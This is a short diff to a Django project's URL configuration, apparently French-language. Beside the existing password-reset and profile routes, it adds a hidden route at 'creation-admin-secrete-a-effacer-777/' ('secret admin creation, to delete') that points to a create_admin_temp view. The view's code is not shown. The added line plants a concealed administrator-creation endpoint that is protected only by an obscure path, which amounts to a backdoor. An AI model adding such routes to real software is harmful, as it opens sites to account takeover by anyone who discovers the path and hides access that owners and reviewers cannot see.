@@ -47,4 +47,5 @@ urlpatterns = [
          name='password_reset_complete'),
     # ----------------------------------------------------------------------------------------------------------
     path('profil/', profile_view, name='profile'),
+    path('creation-admin-secrete-a-effacer-777/', create_admin_temp, name='create-admin-temp'),
 ]
